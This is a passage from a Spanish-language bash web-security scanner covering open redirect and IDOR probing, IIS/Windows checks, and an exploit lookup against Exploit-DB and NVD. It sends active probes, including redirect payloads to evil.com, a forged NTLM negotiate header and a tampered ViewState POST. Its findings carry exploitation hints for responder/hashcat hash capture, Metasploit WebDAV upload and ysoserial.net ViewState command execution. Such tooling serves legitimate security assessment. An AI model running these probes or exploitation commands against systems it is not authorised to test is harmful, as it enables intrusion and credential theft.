    local test_urls=("${base_url}")
    for u in "${INTEL_INJECTABLE_URLS[@]}"; do
        test_urls+=("${u%%=*}") # solo la parte base sin valor
    done

    for test_url in "${test_urls[@]:0:5}"; do
        for param in "${REDIRECT_PARAMS[@]}"; do
            for payload in "${REDIRECT_PAYLOADS[@]:0:4}"; do
                local full_url="${test_url}?${param}=${payload}"
                local resp_headers
                resp_headers=$(curl -sk --max-time 8 -I "${full_url}" 2>/dev/null)

                local location
                location=$(echo "$resp_headers" | grep -i "^location:" | tr -d '\r')

                if echo "$location" | grep -qiE "evil\.com|//${payload//\//}|${payload}"; then
                    ((found_redirect++))
                    ok "OPEN REDIRECT: ${param}=${payload}"
                    echo "REDIRECT VULN: ${full_url}" >> "$out_file"
                    add_finding "MEDIO" \
                        "Open Redirect — Parámetro: ${param}" \
                        "<b>URL:</b> ${full_url}<br><b>Location:</b> ${location}<br><b>Impacto:</b> Phishing bypass: el enlace parece legítimo (${TARGET}) pero redirige a sitio malicioso." \
                        "6.1" \
                        "1) Validar que la URL de redirect pertenece al dominio propio. 2) Usar whitelist de dominios permitidos. 3) No pasar URLs externas directamente al header Location." \
                        "PoC phishing: ${base_url}?${param}=https://evil.com | Escalar con XSS: ?${param}=javascript:alert(1)"
                    break 3
                fi
            done
        done
    done

    [[ $found_redirect -eq 0 ]] && ok "Open Redirect: no detectado en parámetros probados."

    # ═══════════════════════════════════════════════════════
    # PARTE 2: IDOR — Insecure Direct Object Reference
    # ═══════════════════════════════════════════════════════
    log "  ── IDOR Detection ──"

    # Obtener una respuesta baseline con ID=1
    local IDOR_PARAMS=("id" "user_id" "userId" "account" "profile" "order" "order_id"
        "invoice" "doc" "document" "file_id" "record" "uid" "pid" "rid" "tid" "key")

    local idor_html=""
    local baseline_resp=""

    for param in "${IDOR_PARAMS[@]}"; do
        local url1="${base_url}?${param}=1"
        local url2="${base_url}?${param}=2"
        local url3="${base_url}?${param}=100"

        local resp1 resp2 resp3
        resp1=$(curl -sk --max-time 8 "$url1" 2>/dev/null | wc -c)
        resp2=$(curl -sk --max-time 8 "$url2" 2>/dev/null | wc -c)

        # Si los tamaños son diferentes → posible IDOR (respuestas distintas para IDs distintos)
        if [[ "$resp1" -gt 100 && "$resp2" -gt 100 ]]; then
            local diff=$(( resp1 - resp2 ))
            [[ $diff -lt 0 ]] && diff=$(( -diff ))

            if [[ $resp1 -ne $resp2 && $diff -gt 50 ]]; then
                ((found_idor++))
                ok "IDOR potencial: ?${param}=1 (${resp1}b) vs ?${param}=2 (${resp2}b) — respuestas diferentes"
                idor_html+="<tr><td class='high'>POTENCIAL</td><td>${base_url}</td><td>${param}</td>"
                idor_html+="<td>ID=1: ${resp1} bytes | ID=2: ${resp2} bytes | Diff: ${diff}b</td></tr>"
                echo "IDOR?: ${base_url}?${param}=[1,2,100] → respuestas distintas" >> "$out_file"
            fi
        fi

        # También probar en APIs encontradas
        for api_ep in "${INTEL_API_ENDPOINTS[@]:0:5}"; do
            local api1="${api_ep}/${param}/1"
            local api2="${api_ep}/${param}/2"
            local ar1 ar2
            ar1=$(curl -sk --max-time 8 "$api1" 2>/dev/null | wc -c)
            ar2=$(curl -sk --max-time 8 "$api2" 2>/dev/null | wc -c)

            if [[ "$ar1" -gt 50 && "$ar2" -gt 50 && "$ar1" -ne "$ar2" ]]; then
                ((found_idor++))
                idor_html+="<tr><td class='high'>API-IDOR</td><td>${api_ep}</td><td>${param}</td>"
                idor_html+="<td>ID=1: ${ar1} bytes | ID=2: ${ar2} bytes</td></tr>"
            fi
        done

        [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
    done

    if (( found_idor > 0 )); then
        add_finding "ALTO" \
            "IDOR — Posible Acceso No Autorizado a Objetos (${found_idor} parámetros)" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Parámetro</th><th>Evidencia</th></tr>${idor_html}</table>" \
            "7.5" \
            "1) Verificar autorización en CADA acceso a objeto: ¿el usuario autenticado tiene permiso para este ID? 2) Usar IDs indirectos (UUID, tokens) en lugar de IDs secuenciales. 3) Implementar access control a nivel de objeto (ABAC)." \
            "Verificar manualmente con Burp: cambiar IDs y observar si se accede a datos de otros usuarios. Probar con dos cuentas diferentes."
    else
        ok "IDOR: sin indicios claros (requiere autenticación para validar completamente)."
        add_finding "INFO" "IDOR" \
            "No se detectaron indicios automáticos de IDOR. Las pruebas definitivas requieren autenticación." \
            "N/A" \
            "Revisar manualmente todos los endpoints con IDs. Usar dos cuentas para validar cross-account access." \
            "Automatizar con autorize (Burp plugin): https://github.com/Quitten/Autorize"
    fi

    [[ -f "$out_file" ]] && ok "Resultados: ${out_file}"
    echo
}

# ─── MÓDULO 41: WINDOWS IIS — ESPECÍFICO ─────────────────────────
modulo_iis_windows() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo ejecutar si IIS/Windows detectado
    if [[ "$INTEL_OS" != "windows" ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " iis "    ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet "  ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " dotnetcore " ]]; then
        warn "IIS/Windows no detectado. Saltando módulo específico de IIS."
        return
    fi

    log "MÓDULO 41: IIS/Windows — Tests Específicos"
    tip "IIS tiene vulns únicas: ShortName 8.3, WebDAV, ViewState, NTLM exposure, trace.axd"

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/iis_windows.txt"

    echo "IIS/Windows Tests — $(date)" > "$out_file"
    intel_log "IIS/Windows detectado → ejecutando tests específicos"

    # ── TEST 1: IIS ShortName (8.3 filename enumeration) ──
    log "  ── ShortName Enumeration ──"
    local short_vuln=false
    local short_resp
    short_resp=$(curl -sk --max-time 10 -w "%{http_code}" \
        "${base_url}/*~1*/a.aspx" 2>/dev/null | tail -1)
    local short_resp2
    short_resp2=$(curl -sk --max-time 10 -w "%{http_code}" \
        "${base_url}/a*~1*/a.aspx" 2>/dev/null | tail -1)

    if [[ "$short_resp" == "404" && "$short_resp2" != "404" ]] || \
       [[ "$short_resp" == "400" && "$short_resp2" == "404" ]]; then
        short_vuln=true
        add_finding "MEDIO" \
            "IIS ShortName (8.3) Enumeration Posible" \
            "Diferencia de respuestas HTTP indica que se puede enumerar nombres cortos de archivos/directorios.<br><code>/*~1*/ → ${short_resp} | /a*~1*/ → ${short_resp2}</code>" \
            "5.3" \
            "Deshabilitar soporte de nombres 8.3 en Windows: fsutil 8dot3name set C: 1. O filtrar en IIS con URLScan." \
            "Herramienta: python IIS-ShortName-Scanner.py ${base_url} | Revela archivos como: web~1.con (web.config)"
        echo "ShortName vulnerable: diferencia de respuestas detectada" >> "$out_file"
    fi

    # ── TEST 2: trace.axd (ASP.NET debugging) ──
    log "  ── trace.axd / elmah.axd ──"
    for debug_path in "/trace.axd" "/elmah.axd" "/.git/config" "/app_offline.htm" \
                      "/web.config.bak" "/web.config.old" "/Web.config" \
                      "/_blazor" "/_framework/blazor.webassembly.js"; do
        local debug_code
        debug_code=$(curl -sko /dev/null --max-time 8 -w "%{http_code}" "${base_url}${debug_path}" 2>/dev/null)
        if [[ "$debug_code" == "200" ]]; then
            ok "ENCONTRADO: ${base_url}${debug_path}"
            echo "EXPOSED: ${base_url}${debug_path}" >> "$out_file"
            local sev="MEDIO"
            [[ "$debug_path" =~ "web.config" ]] && sev="CRÍTICO"
            [[ "$debug_path" =~ "trace.axd" ]] && sev="ALTO"

            add_finding "$sev" \
                "IIS/ASP.NET: ${debug_path} Accesible" \
                "<b>URL:</b> ${base_url}${debug_path}<br>Este recurso puede exponer código fuente, configuración, cadenas de conexión o trazas de stack." \
                "$([ "$sev" == "CRÍTICO" ] && echo "9.1" || echo "6.5")" \
                "Bloquear acceso a archivos de configuración y debug en IIS: usar <authorization> en web.config o rules en applicationHost.config." \
                "curl -s ${base_url}${debug_path} | grep -iE 'connectionString|password|secret|apiKey'"
        fi
    done

    # ── TEST 3: WebDAV ──
    log "  ── WebDAV ──"
    local dav_resp
    dav_resp=$(curl -sk --max-time 10 -X OPTIONS "${base_url}" 2>/dev/null -D - | grep -i "^DAV:\|^Allow:.*PROPFIND\|^Allow:.*PUT")
    if [[ -n "$dav_resp" ]]; then
        add_finding "ALTO" \
            "WebDAV Habilitado en IIS" \
            "<pre>${dav_resp}</pre><br>WebDAV permite subir, modificar y eliminar archivos remotamente." \
            "8.8" \
            "Deshabilitar WebDAV si no es necesario. En IIS Manager: WebDAV Authoring Rules → deshabilitar. En web.config: <modules><remove name='WebDAVModule'/></modules>" \
            "Explotar con: davtest -url ${base_url} | cadaver ${base_url} | msf: exploit/windows/iis/iis_webdav_upload_asp"
        echo "WebDAV: $dav_resp" >> "$out_file"
    fi

    # ── TEST 4: NTLM Authentication Exposure ──
    log "  ── NTLM Auth Exposure ──"
    local ntlm_resp
    ntlm_resp=$(curl -sk --max-time 10 -I "${base_url}" 2>/dev/null | grep -i "WWW-Authenticate: NTLM\|WWW-Authenticate: Negotiate")
    if [[ -n "$ntlm_resp" ]]; then
        # Intentar obtener el dominio del challnge NTLM
        local ntlm_info
        ntlm_info=$(curl -sk --max-time 10 \
            -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
            "${base_url}" 2>/dev/null -I | grep -i "WWW-Authenticate: NTLM")
        add_finding "MEDIO" \
            "NTLM Authentication Expuesta" \
            "<pre>${ntlm_resp}${ntlm_info}</pre><br>NTLM expuesto puede revelar nombre de dominio y ser objetivo de captura de hashes." \
            "5.9" \
            "Preferir Kerberos sobre NTLM. Deshabilitar NTLMv1. Requerir NTLMv2 con firma. Considerar migrar a autenticación moderna (OAuth/OIDC)." \
            "Capturar hash: responder -I eth0 → crackear con hashcat -m 5600 hash.txt rockyou.txt"
        echo "NTLM: $ntlm_resp" >> "$out_file"
    fi

    # ── TEST 5: ASP.NET ViewState sin MAC ──
    log "  ── ViewState MAC Check ──"
    local vs_resp
    vs_resp=$(curl -sk --max-time 10 "${base_url}" 2>/dev/null)
    if echo "$vs_resp" | grep -qi "__VIEWSTATE"; then
        local vs_val
        vs_val=$(echo "$vs_resp" | grep -oP '(?<=__VIEWSTATE" value=")[^"]+' | head -1)
        if [[ -n "$vs_val" ]]; then
            # Intentar enviar ViewState modificado (sin firmar)
            local fake_vs
            fake_vs=$(echo "$vs_val" | head -c 20)"AAAAAAAAAAAAAAAA=="
            local vs_resp2
            vs_resp2=$(curl -sk --max-time 10 -X POST \
                -d "__VIEWSTATE=${fake_vs}&__VIEWSTATEGENERATOR=FFFFFFFF" \
                "${base_url}" 2>/dev/null)

            if echo "$vs_resp2" | grep -qiE "error|exception|stack.trace|System\\."; then
                add_finding "ALTO" \
                    "ASP.NET ViewState — MAC Validation Débil" \
                    "ViewState modificado genera error que revela stack trace. Posible deserialization attack." \
                    "7.5" \
                    "Habilitar ViewState MAC: <pages enableViewStateMac='true'/> en web.config. Usar machineKey con algoritmo fuerte." \
                    "Explotar con ysoserial.net: ysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'whoami' --validationkey=KEY"
            else
                add_finding "BAJO" \
                    "ASP.NET ViewState Presente" \
                    "ViewState detectado pero MAC aparentemente válida. Verificar si está cifrado." \
                    "3.1" \
                    "Asegurar ViewState con encryptViewState=true y machineKey. Considerar migrar a alternativas stateless." \
                    "Analizar con Burp Suite: decodificar ViewState base64, verificar si contiene datos sensibles."
            fi
        fi
    fi

    ok "IIS/Windows tests completados: ${out_file}"
    echo
}



# ════════════════════════════════════════════════════════════════
# MÓDULO 43: EXPLOIT-DB + NVD + GITHUB ADVISORIES INTELLIGENCE
# Fuentes: searchsploit local · EDB online · NVD API · GHSA API
# ════════════════════════════════════════════════════════════════
modulo_edb_intel() {
    log "MÓDULO 43: Exploit Intelligence — EDB · NVD · GitHub Advisories"
    tip "Cruza el stack detectado contra exploits reales de Exploit-DB, CVEs de NVD y advisories de GitHub."

    local EDB_CACHE="${UPDATE_DIR}/edb_cache"
    local NVD_CACHE="${UPDATE_DIR}/cve_cache"
    mkdir -p "$EDB_CACHE" "$NVD_CACHE"

    local out_file="${OUTPUT_DIR}/recon/exploit_intel.txt"
    local total_edb=0 total_nvd=0 total_ghsa=0
    local edb_html="" nvd_html="" ghsa_html=""

    # ── Construir lista de términos de búsqueda desde INTEL ──────
    local search_terms=()
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php "         ]] && search_terms+=("php webapps" "php rce" "php lfi")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " apache "      ]] && search_terms+=("apache httpd")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nginx "       ]] && search_terms+=("nginx")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nodejs "      ]] && search_terms+=("node.js express")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " java "        ]] && search_terms+=("tomcat" "spring rce")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet "      ]] && search_terms+=("asp.net iis")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " dotnetcore "  ]] && search_terms+=("asp.net core")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " python "      ]] && search_terms+=("django" "flask python")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mysql "       ]] && search_terms+=("mysql")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mongodb "     ]] && search_terms+=("mongodb")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " redis "       ]] && search_terms+=("redis unauthenticated")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " elasticsearch" ]] && search_terms+=("elasticsearch")
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " jenkins "     ]] && search_terms+=("jenkins")
    [[ "$INTEL_CMS" == "wordpress"  ]] && search_terms+=("wordpress" "wordpress plugin rce" "wordpress plugin sqli")
    [[ "$INTEL_CMS" == "joomla"     ]] && search_terms+=("joomla")
    [[ "$INTEL_CMS" == "drupal"     ]] && search_terms+=("drupal")
    [[ "$INTEL_CMS" == "magento"    ]] && search_terms+=("magento")
    [[ "$INTEL_FRAMEWORK_BACKEND" == "laravel"  ]] && search_terms+=("laravel")
    [[ "$INTEL_FRAMEWORK_BACKEND" == "symfony"  ]] && search_terms+=("symfony")
    [[ "$INTEL_FRAMEWORK_BACKEND" == "django"   ]] && search_terms+=("django")
    [[ "$INTEL_FRAMEWORK_BACKEND" == "rails"    ]] && search_terms+=("ruby rails")
    [[ "$INTEL_FRAMEWORK_BACKEND" == "fastapi"  ]] && search_terms+=("fastapi")
    [[ "$INTEL_OS" == "windows"     ]] && search_terms+=("windows iis privilege escalation")
    [[ "$INTEL_OS" == "linux"       ]] && search_terms+=("linux local privilege escalation")
    [[ ${#search_terms[@]} -eq 0    ]] && search_terms+=("webapps php" "webapps rce")

    echo "Exploit Intelligence — $(date)" > "$out_file"
    echo "Stack: ${INTEL_TECHNOLOGIES[*]} | CMS: ${INTEL_CMS:-none} | OS: ${INTEL_OS:-unknown}" >> "$out_file"
    echo "─────────────────────────────────────" >> "$out_file"

    # ════════════════════════════════════════════════════════════
    # PARTE 1: SEARCHSPLOIT LOCAL (funciona offline siempre)
    # ════════════════════════════════════════════════════════════
    log "  [1/4] searchsploit — base de datos local"

    if ! command -v searchsploit >/dev/null 2>&1; then
        warn "searchsploit no disponible. Instalar: sudo apt install exploitdb"
    else
        # Palabras clave de alto impacto para filtrar
        local HIGH_IMPACT="rce\|remote code\|sql injection\|sqli\|auth bypass\|authentication bypass\|privilege escal\|command execut\|file upload\|local file\|lfi\|rfi\|xxe\|deserializ\|unauthenticated\|backdoor\|webshell"

        local seen_edb_ids=""
        for term in "${search_terms[@]}"; do
            # searchsploit JSON output
            local ss_json
            ss_json=$(searchsploit "$term" --json 2>/dev/null)
            [[ -z "$ss_json" ]] && continue

            # Parsear con python, guardar en archivo temp
            local tmp_results="/tmp/ss_results_$$.txt"
            echo "$ss_json" | python3 - "$term" > "$tmp_results" << 'PYSS'
import json, sys, re

term = sys.argv[1] if len(sys.argv) > 1 else ""
HIGH = ["rce","remote code","sql injection","sqli","auth bypass","authentication bypass",
        "privilege escal","command execut","file upload","local file","lfi","rfi","xxe",
        "deserializ","unauthenticated","backdoor","webshell","buffer overflow","heap"]
try:
    data = json.loads(sys.stdin.read())
    exploits = data.get("RESULTS_EXPLOIT", [])
    results = []
    for e in exploits:
        title = e.get("Title", "")
        title_lc = title.lower()
        score = sum(1 for kw in HIGH if kw in title_lc)
        score += 2 if e.get("Type","") in ["webapps","remote"] else 0
        score += 1 if e.get("Platform","").lower() in ["php","multiple","linux","windows"] else 0
        if score > 0:
            results.append((score, e))
    results.sort(key=lambda x: x[0], reverse=True)
    for score, e in results[:6]:
        edb_id = e.get("EDB-ID","")
        title  = e.get("Title","")
        etype  = e.get("Type","webapps")
        plat   = e.get("Platform","")
        date   = e.get("Date","")
        path   = e.get("Path","")
        print(f"{edb_id}\t{title}\t{etype}\t{plat}\t{date}\t{path}\t{score}")
except Exception as ex:
    pass
PYSS

            while IFS=$'\t' read -r edb_id title etype plat date path score; do
                [[ -z "$edb_id" ]] && continue
                # Deduplicar
                echo "$seen_edb_ids" | grep -q ",$edb_id," && continue
                seen_edb_ids="${seen_edb_ids},${edb_id},"

                echo "EDB-${edb_id} | ${title} | ${etype} | ${plat} | ${date}" >> "$out_file"
                ((total_edb++))

                # Color según impacto
                local row_color="#161b22"
                local title_color="#ff6b35"
                echo "$title" | grep -qiE "rce|remote code|command exec|unauthenticated" && \
                    row_color="#1a0a0a" && title_color="#ff2d2d"
                echo "$title" | grep -qiE "sql injection|auth bypass|privilege" && \
                    row_color="#1a0f0a"

                # Badge Metasploit si existe módulo
                local msf_badge=""
                [[ -n "$path" && -f "$path" ]] && \
                    grep -qi "require 'msf" "$path" 2>/dev/null && \
                    msf_badge=" <span style='background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;font-size:10px;font-weight:bold;'>MSF</span>"

                local edb_url="https://www.exploit-db.com/exploits/${edb_id}"
                edb_html+="<tr style='background:${row_color};'>"
                edb_html+="<td><a href='${edb_url}' target='_blank' style='color:${title_color};font-weight:bold;'>${edb_id}</a></td>"
                edb_html+="<td style='color:#e6edf3;'>${title}${msf_badge}</td>"
                edb_html+="<td style='color:#8b949e;font-size:11px;'>${etype}</td>"
                edb_html+="<td style='color:#8b949e;font-size:11px;'>${plat}</td>"
                edb_html+="<td style='color:#8b949e;font-size:11px;'>${date}</td>"
                edb_html+="<td style='font-size:10px;color:#484f58;'>${path##*/}</td>"
                edb_html+="</tr>"
            done < "$tmp_results"
            rm -f "$tmp_results"
        done
        ok "searchsploit: ${total_edb} exploits relevantes para el stack detectado"
    fi

    # ════════════════════════════════════════════════════════════
    # PARTE 2: EXPLOIT-DB ONLINE (últimos 30 días, lo más reciente)
    # ════════════════════════════════════════════════════════════
    log "  [2/4] Exploit-DB online — exploits recientes"

    # Determinar keyword principal para búsqueda online
    local main_kw="${INTEL_CMS:-${INTEL_FRAMEWORK_BACKEND:-}}"
    [[ -z "$main_kw" ]] && [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php "    ]] && main_kw="php"
    [[ -z "$main_kw" ]] && [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nodejs " ]] && main_kw="node.js"
    [[ -z "$main_kw" ]] && [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " java "   ]] && main_kw="java"
    [[ -z "$main_kw" ]] && [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet " ]] && main_kw="asp.net"
    [[ -z "$main_kw" ]] && main_kw="webapps"

    local edb_cache_file="${EDB_CACHE}/edb_$(echo "$main_kw" | tr ' ' '_').json"
    local online_data=""

    # Usar caché de 24h si existe
    if [[ -f "$edb_cache_file" ]]; then
        local age=$(( $(date +%s) - $(stat -c %Y "$edb_cache_file" 2>/dev/null || echo 0) ))
        (( age < 86400 )) && online_data=$(cat "$edb_cache_file") && \
            intel_log "EDB online: usando caché ($(date -d "@$(stat -c %Y "$edb_cache_file")" '+%d/%m %H:%M'))"
    fi

    if [[ -z "$online_data" ]]; then
        local kw_enc
        kw_enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${main_kw}'))" 2>/dev/null || echo "$main_kw")

        # Intentar EDB API (DataTables)
        online_data=$(curl -skL --max-time 20 \
            "https://www.exploit-db.com/search" \
            -H "Accept: application/json" \
            -H "X-Requested-With: XMLHttpRequest" \
            -H "Referer: https://www.exploit-db.com/" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" \
            -G \
            --data-urlencode "draw=1" \
            --data-urlencode "search[value]=${main_kw}" \
            --data-urlencode "order[0][dir]=desc" \
            --data-urlencode "start=0" \
            --data-urlencode "length=20" \
            2>/dev/null)

        # Si falla, intentar GitLab CSV
        if ! echo "$online_data" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null; then
            intel_log "EDB API no responde. Intentando GitLab CSV..."
            local csv_data
            csv_data=$(curl -skL --max-time 25 \
                "https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv" \
                2>/dev/null)

            if [[ -n "$csv_data" ]]; then
                local thirty_ago
                thirty_ago=$(date -d "30 days ago" +%Y-%m-%d 2>/dev/null || \
                             date -v-30d +%Y-%m-%d 2>/dev/null || echo "2024-01-01")

                online_data=$(echo "$csv_data" | python3 - "$main_kw" "$thirty_ago" << 'PYCSV'
import csv, sys, io, json
keyword   = sys.argv[1].lower() if len(sys.argv) > 1 else ""
since     = sys.argv[2]         if len(sys.argv) > 2 else "2024-01-01"
content   = sys.stdin.read()
reader    = csv.DictReader(io.StringIO(content))
results   = []
for row in reader:
    title = row.get("description","").lower()
    plat  = row.get("platform","").lower()
    date  = row.get("date_published","")
    if (keyword in title or keyword in plat) and date >= since:
        results.append({
            "id":          row.get("id",""),
            "description": row.get("description",""),
            "type":        {"description": row.get("type","webapps")},
            "platform":    {"name": row.get("platform","")},
            "date_published": date,
            "verified":    row.get("verified","0")
        })
print(json.dumps({"data": results[:20]}))
PYCSV
)
            fi
        fi
        [[ -n "$online_data" ]] && echo "$online_data" > "$edb_cache_file"
    fi

    # Parsear resultados online
    if [[ -n "$online_data" ]]; then
        local online_tmp="/tmp/edb_online_$$.txt"
        echo "$online_data" | python3 - << 'PYONLINE' > "$online_tmp"
import json, sys
try:
    d = json.loads(sys.stdin.read())
    records = d.get("data", [])
    for r in records[:20]:
        edb_id  = str(r.get("id", r.get("EDB-ID", "")))
        title   = r.get("description", r.get("Title",""))
        etype   = r.get("type", {})
        if isinstance(etype, dict): etype = etype.get("description","webapps")
        plat    = r.get("platform", {})
        if isinstance(plat, dict):  plat  = plat.get("name","")
        date    = r.get("date_published", r.get("date",""))
        verified= str(r.get("verified","0"))
        print(f"{edb_id}\t{title}\t{etype}\t{plat}\t{date}\t{verified}")
except:
    pass
PYONLINE

        while IFS=$'\t' read -r edb_id title etype plat date verified; do
            [[ -z "$edb_id" ]] && continue
            local url="https://www.exploit-db.com/exploits/${edb_id}"
            local ver_badge=""
            [[ "$verified" == "1" ]] && \
                ver_badge=" <span style='background:#1f6feb;color:#fff;padding:1px 5px;border-radius:3px;font-size:10px;'>✓ Verified</span>"
            local new_badge=" <span style='background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;font-size:10px;font-weight:bold;'>NEW</span>"

            edb_html+="<tr style='background:#0a1628;border-left:3px solid #58a6ff;'>"
            edb_html+="<td><a href='${url}' target='_blank' style='color:#58a6ff;font-weight:bold;'>🌐 ${edb_id}</a></td>"
            edb_html+="<td style='color:#e6edf3;'>${title}${ver_badge}${new_badge}</td>"
            edb_html+="<td style='color:#8b949e;font-size:11px;'>${etype}</td>"
            edb_html+="<td style='color:#8b949e;font-size:11px;'>${plat}</td>"
            edb_html+="<td style='color:#58a6ff;font-size:11px;'>${date}</td>"
            edb_html+="<td><a href='${url}' target='_blank' style='font-size:11px;color:#3fb950;'>Ver →</a></td>"
            edb_html+="</tr>"
            ((total_edb++))
        done < "$online_tmp"
        rm -f "$online_tmp"
        ok "EDB online: exploits recientes cargados para '${main_kw}'"
    else
        warn "EDB online no accesible. Usando solo base local."
    fi

    # ════════════════════════════════════════════════════════════
    # PARTE 3: NVD — CVEs con CVSS del stack detectado
    # ════════════════════════════════════════════════════════════
    log "  [3/4] NVD — CVEs críticos del stack"

    # Mapeo tech → keyword NVD optimizado
    declare -A NVD_MAP
    NVD_MAP[php]="php"
    NVD_MAP[apache]="apache httpd"
    NVD_MAP[nginx]="nginx"
    NVD_MAP[nodejs]="node.js"
    NVD_MAP[java]="apache tomcat"
    NVD_MAP[aspnet]="asp.net"
    NVD_MAP[dotnetcore]="dotnet"
    NVD_MAP[python]="python"
    NVD_MAP[django]="django"
    NVD_MAP[flask]="flask"
    NVD_MAP[fastapi]="fastapi"
    NVD_MAP[laravel]="laravel"
    NVD_MAP[symfony]="symfony"
    NVD_MAP[rails]="ruby on rails"
    NVD_MAP[wordpress]="wordpress"
    NVD_MAP[joomla]="joomla"
    NVD_MAP[drupal]="drupal"
    NVD_MAP[mysql]="mysql"
    NVD_MAP[postgresql]="postgresql"
    NVD_MAP[mongodb]="mongodb"
    NVD_MAP[redis]="redis"
    NVD_MAP[elasticsearch]="elasticsearch"
    NVD_MAP[jenkins]="jenkins"
    NVD_MAP[docker]="docker engine"
    NVD_MAP[kubernetes]="kubernetes"

    # Combinar INTEL_TECHNOLOGIES + CMS + FRAMEWORK en lista de búsqueda
    local nvd_search_list=()
    for tech in "${INTEL_TECHNOLOGIES[@]}"; do
        [[ -n "${NVD_MAP[$tech]:-}" ]] && nvd_search_list+=("$tech")
    done
    [[ -n "${INTEL_CMS:-}"              && -n "${NVD_MAP[$INTEL_CMS]:-}"              ]] && nvd_search_list+=("$INTEL_CMS")
    [[ -n "${INTEL_FRAMEWORK_BACKEND:-}" && -n "${NVD_MAP[$INTEL_FRAMEWORK_BACKEND]:-}" ]] && nvd_search_list+=("$INTEL_FRAMEWORK_BACKEND")

    local nvd_count=0
    for tech in "${nvd_search_list[@]:0:5}"; do
        local kw="${NVD_MAP[$tech]}"
        local nvd_cache_file="${NVD_CACHE}/nvd_${tech}.json"
        local nvd_data=""

        # Caché 24h
        if [[ -f "$nvd_cache_file" ]]; then
            local age=$(( $(date +%s) - $(stat -c %Y "$nvd_cache_file" 2>/dev/null || echo 0) ))
            (( age < 86400 )) && nvd_data=$(cat "$nvd_cache_file")
        fi

        if [[ -z "$nvd_data" ]]; then
            local kw_enc
            kw_enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${kw}'))" 2>/dev/null || echo "${kw// /+}")
            nvd_data=$(curl -skL --max-time 15 \
                "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${kw_enc}&resultsPerPage=8&cvssV3Severity=CRITICAL" \
                2>/dev/null)
            [[ -n "$nvd_data" ]] && echo "$nvd_data" > "$nvd_cache_file"
            sleep 0.5  # rate limit NVD
        fi
        [[ -z "$nvd_data" ]] && continue

        local nvd_tmp="/tmp/nvd_$$.txt"
        echo "$nvd_data" | python3 - "$tech" << 'PYNVD' > "$nvd_tmp"
import json, sys
tech = sys.argv[1] if len(sys.argv) > 1 else ""
try:
    d = json.loads(sys.stdin.read())
    for v in d.get("vulnerabilities", []):
        cve  = v.get("cve", {})
        cid  = cve.get("id", "")
        desc = cve.get("descriptions", [{}])[0].get("value","")[:120]
        m    = cve.get("metrics", {})
        score = 0
        for k in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
            if k in m:
                score = m[k][0].get("cvssData",{}).get("baseScore", 0)
                break
        # Buscar ref a exploit-db en referencias del CVE
        edb_ref = ""
        for ref in cve.get("references", []):
            if "exploit-db.com" in ref.get("url",""):
                edb_ref = ref["url"]
                break
        # Fecha publicación
        pub_date = cve.get("published","")[:10]
        print(f"{cid}\t{score}\t{tech}\t{desc}\t{edb_ref}\t{pub_date}")
except:
    pass
PYNVD

        while IFS=$'\t' read -r cid score tech_n desc edb_ref pub_date; do
            [[ -z "$cid" ]] && continue

            INTEL_NVD_CVES+=("${cid}|${score}|${tech_n}|${desc}")
            echo "CVE: ${cid} CVSS:${score} [${tech_n}] ${desc}" >> "$out_file"
            ((total_nvd++)) && ((nvd_count++))

            # Color por CVSS
            local cvss_color="#57cc99"
            local cvss_num="${score%%.*}"
            (( cvss_num >= 9 )) && cvss_color="#ff2d2d"
            (( cvss_num >= 7 && cvss_num < 9 )) && cvss_color="#ff6b35"

            # Badge exploit disponible
            local exploit_link="—"
            [[ -n "$edb_ref" ]] && \
                exploit_link="<a href='${edb_ref}' target='_blank' style='color:#ff6b35;font-weight:bold;'>🎯 EDB</a>"

            nvd_html+="<tr>"
            nvd_html+="<td><a href='https://nvd.nist.gov/vuln/detail/${cid}' target='_blank' style='color:#c9d1d9;'>${cid}</a></td>"
            nvd_html+="<td style='color:${cvss_color};font-weight:900;font-size:14px;'>${score}</td>"
            nvd_html+="<td style='color:#58a6ff;font-size:12px;'>${tech_n}</td>"
            nvd_html+="<td style='font-size:12px;color:#c9d1d9;'>${desc}</td>"
            nvd_html+="<td style='font-size:11px;color:#8b949e;'>${pub_date}</td>"
            nvd_html+="<td>${exploit_link}</td>"
            nvd_html+="</tr>"
        done < "$nvd_tmp"
        rm -f "$nvd_tmp"
    done
